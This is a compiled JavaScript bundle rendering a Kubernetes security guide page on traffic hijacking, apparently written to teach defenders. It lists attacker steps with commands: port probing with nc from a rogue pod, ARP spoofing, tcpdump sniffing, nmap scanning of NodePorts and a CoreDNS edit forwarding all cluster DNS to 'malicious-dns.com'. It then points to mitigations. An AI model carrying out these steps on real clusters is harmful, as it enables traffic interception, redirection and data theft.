"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[3077],{2873:(e,t,i)=>{i.r(t),i.d(t,{assets:()=>o,contentTitle:()=>c,default:()=>p,frontMatter:()=>a,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"attack_vectors/traffic_hijacking","title":"Traffic Hijacking","description":"How attackers manipulate Kubernetes network traffic to intercept, redirect, or disrupt communication between workloads.","source":"@site/docs/attack_vectors/traffic_hijacking.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/traffic_hijacking","permalink":"/k8s_security/docs/attack_vectors/traffic_hijacking","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/traffic_hijacking.md","tags":[],"version":"current","sidebarPosition":11,"frontMatter":{"sidebar_position":11,"title":"Traffic Hijacking","description":"How attackers manipulate Kubernetes network traffic to intercept, redirect, or disrupt communication between workloads."},"sidebar":"guidesSidebar","previous":{"title":"Supply Chain Attacks","permalink":"/k8s_security/docs/attack_vectors/supply_chain_attacks"},"next":{"title":"Unrestricted etcd Access","permalink":"/k8s_security/docs/attack_vectors/unrestricted_etcd_access"}}');var s=i(4848),r=i(8453);const a={sidebar_position:11,title:"Traffic Hijacking",description:"How attackers manipulate Kubernetes network traffic to intercept, redirect, or disrupt communication between workloads."},c="Traffic Hijacking",o={},l=[{value:"Exploitation Steps: Manipulating Kubernetes Network Traffic",id:"exploitation-steps-manipulating-kubernetes-network-traffic",level:2},{value:"Step 1: Exploit Missing Network Policies",id:"step-1-exploit-missing-network-policies",level:3},{value:"Step 2: Conduct a Man-in-the-Middle (MITM) Attack",id:"step-2-conduct-a-man-in-the-middle-mitm-attack",level:3},{value:"Step 3: Manipulate Kubernetes DNS",id:"step-3-manipulate-kubernetes-dns",level:3},{value:"Step 4: Abuse External Service Exposure",id:"step-4-abuse-external-service-exposure",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation Steps",id:"mitigation-steps",level:2}];function d(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.header,{children:(0,s.jsx)(t.h1,{id:"traffic-hijacking",children:"Traffic Hijacking"})}),"\n",(0,s.jsxs)(t.p,{children:[(0,s.jsx)(t.strong,{children:"Traffic hijacking"})," in Kubernetes occurs when an attacker intercepts, redirects, or disrupts network traffic within the cluster. This can lead to ",(0,s.jsx)(t.strong,{children:"data exfiltration, man-in-the-middle (MITM) attacks, service downtime, and unauthorized access to sensitive information"}),"."]}),"\n",(0,s.jsx)(t.hr,{}),"\n",(0,s.jsx)(t.h2,{id:"exploitation-steps-manipulating-kubernetes-network-traffic",children:"Exploitation Steps: Manipulating Kubernetes Network Traffic"}),"\n",(0,s.jsxs)(t.p,{children:["An attacker exploits ",(0,s.jsx)(t.strong,{children:"misconfigured network policies, insecure service exposure, or DNS manipulation"})," to hijack traffic."]}),"\n",(0,s.jsx)(t.h3,{id:"step-1-exploit-missing-network-policies",children:"Step 1: Exploit Missing Network Policies"}),"\n",(0,s.jsx)(t.p,{children:"If network policies are not enforced, the attacker scans for open communication paths:"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"kubectl get networkpolicies --all-namespaces\n"})}),"\n",(0,s.jsx)(t.p,{children:"If no restrictive policies exist, the attacker can access internal workloads:"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"kubectl run attacker-pod --rm -it --image=alpine -- /bin/sh\nnc -zv <target-pod-ip> 443\n"})}),"\n",(0,s.jsx)(t.p,{children:"Without network segmentation, lateral movement between pods is possible."}),"\n",(0,s.jsx)(t.h3,{id:"step-2-conduct-a-man-in-the-middle-mitm-attack",children:"Step 2: Conduct a Man-in-the-Middle (MITM) Attack"}),"\n",(0,s.jsxs)(t.p,{children:["If an attacker gains access to a compromised pod, they can intercept internal traffic using ",(0,s.jsx)(t.strong,{children:"ARP spoofing"}),":"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"arpspoof -i eth0 -t <victim-ip> <gateway-ip>\n"})}),"\n",(0,s.jsxs)(t.p,{children:["Or by using ",(0,s.jsx)(t.strong,{children:"tcpdump"})," to capture sensitive data:"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"tcpdump -i eth0 -A port 443\n"})}),"\n",(0,s.jsx)(t.p,{children:"This allows the attacker to read and modify unencrypted traffic."}),"\n",(0,s.jsx)(t.h3,{id:"step-3-manipulate-kubernetes-dns",children:"Step 3: Manipulate Kubernetes DNS"}),"\n",(0,s.jsxs)(t.p,{children:["If ",(0,s.jsx)(t.strong,{children:"CoreDNS"})," is misconfigured, the attacker can modify DNS responses to redirect traffic:"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"kubectl edit configmap coredns -n kube-system\n"})}),"\n",(0,s.jsx)(t.p,{children:"By injecting a rogue DNS entry:"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-yaml",children:".:53 {\nforward . malicious-dns.com\n}\n"})}),"\n",(0,s.jsx)(t.p,{children:"All DNS queries in the cluster are now redirected to the attacker's controlled server."}),"\n",(0,s.jsx)(t.h3,{id:"step-4-abuse-external-service-exposure",children:"Step 4: Abuse External Service Exposure"}),"\n",(0,s.jsxs)(t.p,{children:["If services are exposed via ",(0,s.jsx)(t.strong,{children:"NodePort"})," or ",(0,s.jsx)(t.strong,{children:"LoadBalancer"})," without proper authentication, the attacker accesses internal workloads directly:"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"nmap -p 30000-32767 <cluster-node-ip>\n"})}),"\n",(0,s.jsx)(t.p,{children:"If a publicly exposed service is found, the attacker exploits it to extract sensitive data."}),"\n",(0,s.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,s.jsxs)(t.p,{children:["The attacker has successfully ",(0,s.jsx)(t.strong,{children:"intercepted, manipulated, or redirected cluster traffic"}),", leading to ",(0,s.jsx)(t.strong,{children:"data theft, unauthorized access, and service disruption"}),"."]}),"\n",(0,s.jsx)(t.hr,{}),"\n",(0,s.jsx)(t.h2,{id:"mitigation-steps",children:"Mitigation Steps"}),"\n",(0,s.jsxs)(t.p,{children:["To protect against ",(0,s.jsx)(t.strong,{children:"traffic hijacking"}),", follow the security best practices outlined in:"]}),"\n",(0,s.jsxs)(t.p,{children:["\u27a1 ",(0,s.jsx)(t.strong,{children:(0,s.jsx)(t.a,{href:"/docs/best_practices/cluster_setup_and_hardening/network_security/traffic_hijacking_mitigation",children:"Securing Kubernetes Network Traffic"})})]}),"\n",(0,s.jsxs)(t.p,{children:["This guide covers techniques such as ",(0,s.jsx)(t.strong,{children:"enforcing network policies, securing CoreDNS, encrypting intra-cluster traffic, and restricting service exposure"})," to prevent unauthorized network manipulation."]})]})}function p(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},8453:(e,t,i)=>{i.d(t,{R:()=>a,x:()=>c});var n=i(6540);const s={},r=n.createContext(s);function a(e){const t=n.useContext(r);return n.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:a(e.components),n.createElement(r.Provider,{value:t},e.children)}}}]);